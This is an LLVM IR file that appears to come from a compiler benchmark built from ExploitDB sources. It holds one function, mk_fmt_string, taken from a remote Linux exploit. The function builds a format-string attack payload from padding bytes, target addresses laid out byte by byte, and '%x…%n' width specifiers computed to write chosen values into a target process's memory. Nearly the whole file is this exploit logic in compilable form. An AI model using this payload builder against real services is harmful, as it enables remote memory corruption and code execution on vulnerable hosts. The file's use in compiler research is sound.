; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_25321.c_mk_fmt_string.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_25321.c_mk_fmt_string.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [45 x i8] c"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"%s%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @mk_fmt_string(i32 %0, i32 %1, i64 %2, i64 %3, i32 %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i64 %2, i64* %8, align 8
  store i64 %3, i64* %9, align 8
  store i32 %4, i32* %10, align 4
  %23 = call i32 (i32, ...) bitcast (i32 (...)* @xmalloc to i32 (i32, ...)*)(i32 128)
  %24 = sext i32 %23 to i64
  %25 = inttoptr i64 %24 to i8*
  store i8* %25, i8** %15, align 8
  %26 = call i32 (i32, ...) bitcast (i32 (...)* @xmalloc to i32 (i32, ...)*)(i32 516)
  %27 = sext i32 %26 to i64
  %28 = inttoptr i64 %27 to i8*
  store i8* %28, i8** %16, align 8
  %29 = call i32 (i32, ...) bitcast (i32 (...)* @xmalloc to i32 (i32, ...)*)(i32 1024)
  %30 = sext i32 %29 to i64
  %31 = inttoptr i64 %30 to i8*
  store i8* %31, i8** %17, align 8
  %32 = load i8*, i8** %15, align 8
  store i8* %32, i8** %18, align 8
  %33 = load i8, i8* %19, align 1
  %34 = sext i8 %33 to i32
  %35 = load i8, i8* %20, align 1
  %36 = sext i8 %35 to i32
  %37 = load i8, i8* %21, align 1
  %38 = sext i8 %37 to i32
  %39 = load i8, i8* %22, align 1
  %40 = sext i8 %39 to i32
  %41 = load i64, i64* %8, align 8
  %42 = call i32 (i32, i32, i32, i32, i64, ...) bitcast (i32 (...)* @OCT to i32 (i32, i32, i32, i32, i64, ...)*)(i32 %34, i32 %36, i32 %38, i32 %40, i64 %41)
  br label %43

43:                                               ; preds = %52, %5
  %44 = load i32, i32* %6, align 4
  %45 = add i32 %44, -1
  store i32 %45, i32* %6, align 4
  %46 = icmp ne i32 %44, 0
  br i1 %46, label %47, label %50

47:                                               ; preds = %43
  %48 = load i32, i32* %6, align 4
  %49 = icmp ult i32 %48, 16
  br label %50

50:                                               ; preds = %47, %43
  %51 = phi i1 [ false, %43 ], [ %49, %47 ]
  br i1 %51, label %52, label %55

52:                                               ; preds = %50
  %53 = load i8*, i8** %15, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %15, align 8
  store i8 65, i8* %53, align 1
  br label %43

55:                                               ; preds = %50
  %56 = load i8, i8* %22, align 1
  %57 = sext i8 %56 to i32
  %58 = add nsw i32 %57, 0
  %59 = trunc i32 %58 to i8
  %60 = load i8*, i8** %15, align 8
  %61 = getelementptr inbounds i8, i8* %60, i32 1
  store i8* %61, i8** %15, align 8
  store i8 %59, i8* %60, align 1
  %62 = load i8, i8* %21, align 1
  %63 = load i8*, i8** %15, align 8
  %64 = getelementptr inbounds i8, i8* %63, i32 1
  store i8* %64, i8** %15, align 8
  store i8 %62, i8* %63, align 1
  %65 = load i8, i8* %20, align 1
  %66 = load i8*, i8** %15, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %15, align 8
  store i8 %65, i8* %66, align 1
  %68 = load i8, i8* %19, align 1
  %69 = load i8*, i8** %15, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 1
  store i8* %70, i8** %15, align 8
  store i8 %68, i8* %69, align 1
  %71 = load i8, i8* %22, align 1
  %72 = sext i8 %71 to i32
  %73 = add nsw i32 %72, 1
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %15, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %15, align 8
  store i8 %74, i8* %75, align 1
  %77 = load i8, i8* %21, align 1
  %78 = load i8*, i8** %15, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %15, align 8
  store i8 %77, i8* %78, align 1
  %80 = load i8, i8* %20, align 1
  %81 = load i8*, i8** %15, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 1
  store i8* %82, i8** %15, align 8
  store i8 %80, i8* %81, align 1
  %83 = load i8, i8* %19, align 1
  %84 = load i8*, i8** %15, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 1
  store i8* %85, i8** %15, align 8
  store i8 %83, i8* %84, align 1
  %86 = load i8, i8* %22, align 1
  %87 = sext i8 %86 to i32
  %88 = add nsw i32 %87, 2
  %89 = trunc i32 %88 to i8
  %90 = load i8*, i8** %15, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %15, align 8
  store i8 %89, i8* %90, align 1
  %92 = load i8, i8* %21, align 1
  %93 = load i8*, i8** %15, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %15, align 8
  store i8 %92, i8* %93, align 1
  %95 = load i8, i8* %20, align 1
  %96 = load i8*, i8** %15, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %15, align 8
  store i8 %95, i8* %96, align 1
  %98 = load i8, i8* %19, align 1
  %99 = load i8*, i8** %15, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %15, align 8
  store i8 %98, i8* %99, align 1
  %101 = load i8, i8* %22, align 1
  %102 = sext i8 %101 to i32
  %103 = add nsw i32 %102, 3
  %104 = trunc i32 %103 to i8
  %105 = load i8*, i8** %15, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %15, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %21, align 1
  %108 = load i8*, i8** %15, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %15, align 8
  store i8 %107, i8* %108, align 1
  %110 = load i8, i8* %20, align 1
  %111 = load i8*, i8** %15, align 8
  %112 = getelementptr inbounds i8, i8* %111, i32 1
  store i8* %112, i8** %15, align 8
  store i8 %110, i8* %111, align 1
  %113 = load i8, i8* %19, align 1
  %114 = load i8*, i8** %15, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %15, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8*, i8** %15, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 1
  store i8* %117, i8** %15, align 8
  store i8 0, i8* %116, align 1
  %118 = load i8, i8* %19, align 1
  %119 = sext i8 %118 to i32
  %120 = load i8, i8* %20, align 1
  %121 = sext i8 %120 to i32
  %122 = load i8, i8* %21, align 1
  %123 = sext i8 %122 to i32
  %124 = load i8, i8* %22, align 1
  %125 = sext i8 %124 to i32
  %126 = load i64, i64* %9, align 8
  %127 = call i32 (i32, i32, i32, i32, i64, ...) bitcast (i32 (...)* @OCT to i32 (i32, i32, i32, i32, i64, ...)*)(i32 %119, i32 %121, i32 %123, i32 %125, i64 %126)
  %128 = load i8, i8* %22, align 1
  %129 = sext i8 %128 to i32
  %130 = load i32, i32* %10, align 4
  %131 = call i32 (i32, i32, ...) bitcast (i32 (...)* @TOWCALC to i32 (i32, i32, ...)*)(i32 %129, i32 %130)
  store i32 %131, i32* %14, align 4
  %132 = load i32, i32* %14, align 4
  %133 = load i32, i32* %10, align 4
  %134 = add nsw i32 %133, %132
  store i32 %134, i32* %10, align 4
  %135 = load i8, i8* %21, align 1
  %136 = sext i8 %135 to i32
  %137 = load i32, i32* %10, align 4
  %138 = call i32 (i32, i32, ...) bitcast (i32 (...)* @TOWCALC to i32 (i32, i32, ...)*)(i32 %136, i32 %137)
  store i32 %138, i32* %13, align 4
  %139 = load i32, i32* %13, align 4
  %140 = load i32, i32* %10, align 4
  %141 = add nsw i32 %140, %139
  store i32 %141, i32* %10, align 4
  %142 = load i8, i8* %20, align 1
  %143 = sext i8 %142 to i32
  %144 = load i32, i32* %10, align 4
  %145 = call i32 (i32, i32, ...) bitcast (i32 (...)* @TOWCALC to i32 (i32, i32, ...)*)(i32 %143, i32 %144)
  store i32 %145, i32* %12, align 4
  %146 = load i32, i32* %12, align 4
  %147 = load i32, i32* %10, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %10, align 4
  %149 = load i8, i8* %19, align 1
  %150 = sext i8 %149 to i32
  %151 = load i32, i32* %10, align 4
  %152 = call i32 (i32, i32, ...) bitcast (i32 (...)* @TOWCALC to i32 (i32, i32, ...)*)(i32 %150, i32 %151)
  store i32 %152, i32* %11, align 4
  %153 = load i8*, i8** %16, align 8
  %154 = load i32, i32* %14, align 4
  %155 = load i32, i32* %7, align 4
  %156 = load i32, i32* %13, align 4
  %157 = load i32, i32* %7, align 4
  %158 = add i32 %157, 1
  %159 = load i32, i32* %12, align 4
  %160 = load i32, i32* %7, align 4
  %161 = add i32 %160, 2
  %162 = load i32, i32* %11, align 4
  %163 = load i32, i32* %7, align 4
  %164 = add i32 %163, 3
  %165 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %153, i64 516, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i32 %154, i32 %155, i32 %156, i32 %158, i32 %159, i32 %161, i32 %162, i32 %164)
  %166 = load i8*, i8** %17, align 8
  %167 = load i8*, i8** %18, align 8
  %168 = load i8*, i8** %16, align 8
  %169 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %166, i64 1024, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8* %167, i8* %168)
  %170 = load i8*, i8** %18, align 8
  %171 = call i32 (i8*, ...) bitcast (i32 (...)* @free to i32 (i8*, ...)*)(i8* %170)
  %172 = load i8*, i8** %16, align 8
  %173 = call i32 (i8*, ...) bitcast (i32 (...)* @free to i32 (i8*, ...)*)(i8* %172)
  %174 = load i8*, i8** %17, align 8
  ret i8* %174
}

declare dso_local i32 @xmalloc(...) #1

declare dso_local i32 @OCT(...) #1

declare dso_local i32 @TOWCALC(...) #1

declare dso_local i32 @snprintf(i8*, i64, i8*, ...) #1

declare dso_local i32 @free(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
